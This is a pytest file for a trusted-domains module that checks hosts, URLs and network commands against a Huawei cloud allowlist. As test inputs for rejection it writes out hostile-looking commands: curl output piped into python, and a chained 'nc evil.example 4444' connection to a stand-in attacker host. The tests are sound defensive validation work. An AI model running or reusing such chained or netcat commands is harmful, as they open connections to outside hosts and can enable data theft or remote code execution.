from __future__ import annotations

import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "app"
if str(APP) not in sys.path:
    sys.path.insert(0, str(APP))

from trusted_domains import (  # noqa: E402
    all_network_urls_trusted,
    is_huawei_host,
    is_trusted_host,
    is_trusted_url,
    normalize_host,
    network_urls_in,
    trusted_network_command,
)


def test_huawei_host_matching_covers_subdomains_and_cloud_domains():
    assert is_trusted_host("ai.threecloud.huawei.com") is True
    assert is_huawei_host("ai.threecloud.huawei.com") is True
    assert is_trusted_host("models.ascend.huawei.com") is True
    assert is_trusted_host("maas-api.cn-north-4.myhuaweicloud.com") is True
    assert is_trusted_host("www.huaweicloud.com") is True
    assert is_trusted_host("huawei.com") is True
    assert is_trusted_host("HUAWEI.COM") is True
    assert is_trusted_host("huawei.com:443") is True
    assert is_trusted_host("http://ai.threecloud.huawei.com/models/tools/deepseekv4f/v1") is True
    assert (
        normalize_host("https://maas-api.cn-north-4.myhuaweicloud.com/v1")
        == "maas-api.cn-north-4.myhuaweicloud.com"
    )


def test_lookalike_and_unrelated_domains_do_not_match():
    assert is_trusted_host("evilhuawei.com") is False
    assert is_trusted_host("not-huawei.com") is False
    assert is_trusted_host("example.com") is False
    assert is_trusted_host("") is False


def test_trusted_url_uses_host_only():
    url = "http://ai.threecloud.huawei.com/models/tools/deepseekv4f/v1"
    assert is_trusted_url(url) is True
    assert is_trusted_url("https://myhuaweicloud.com/a/b?x=1") is True
    assert is_trusted_url("https://example.com/huawei") is False
    assert is_trusted_url("ftp://ai.threecloud.huawei.com/x") is False


def test_network_url_extraction_and_trust():
    command = (
        'curl -s "http://ai.threecloud.huawei.com/models/tools/deepseekv4f/v1" '
        "-H 'Accept: application/json'"
    )
    urls = network_urls_in(command)
    assert urls
    assert all_network_urls_trusted(command) is True
    assert trusted_network_command(command) is True


def test_trusted_network_command_rejects_chaining_and_unknown_tools():
    assert (
        trusted_network_command(
            "curl http://ai.threecloud.huawei.com/x | python -c 'print(1)'"
        )
        is False
    )
    assert (
        trusted_network_command(
            "curl http://ai.threecloud.huawei.com/x; nc evil.example 4444"
        )
        is False
    )
    assert (
        trusted_network_command(
            "python -c \"import urllib.request; print(urllib.request.urlopen('https://ai.threecloud.huawei.com/x').read())\""
        )
        is False
    )
    assert trusted_network_command("curl https://example.com/x") is False
    assert trusted_network_command("echo no url") is False
